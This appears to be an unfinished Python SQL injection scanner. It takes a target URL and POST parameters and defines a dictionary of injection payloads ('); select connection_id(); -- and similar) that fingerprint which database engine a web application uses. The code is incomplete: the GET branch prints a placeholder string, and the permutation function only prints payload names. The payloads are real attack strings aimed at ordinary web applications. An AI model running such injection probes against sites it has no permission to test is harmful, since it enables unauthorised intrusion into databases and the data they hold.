import mechanize
import requests
from faker import Faker
import argparse


parser = argparse.ArgumentParser()
parser.add_argument("--url", help="Url to send the request.", type= str, required=True, )
parser.add_argument("--method", help="Method for sending the request.", default="GET", type= str)
parser.add_argument("--data", help="Data in case a post request. Ex. name=value,name2=value2", type= str,)

args = parser.parse_args()
method = str.upper(args.method)


#Payloads to find the dbms
find_dbms_payloads = {
    "mysql": "'); select connection_id(); --",
    "postgresql": "'); select pg_client_encoding(); --",
    "mssql": "'); select @@CONNECTIONS; --",
    "oracle": "'); select RAWTOHEX('AB')=RAWTOHEX('AB'); --",
    "sqlite": "'); select sqlite_version(); --",
    "msacess": "'); select last_insert_rowid()>1; --"
}


# POST request
if(method == "POST"):
    if(not args.data):
        print("When POST method is specified you must pass the data argument")
    else: 
        dataArgs = args.data.split(",")
        print(dataArgs)
        postParams = {}
        for arg in dataArgs:
            arg = arg.split("=");
            postParams[arg[0]] = arg[1]
        print(postParams)
        requests.post(args.url, postParams)                    
#GET request    
elif(method == "GET"):
    print("ASfas")
else:
    print("Method got incorrect value")        


def permute_post_params(params):
    requests = {}
    length = len(params)
    for payload in find_dbms_payloads:
        print(payload)
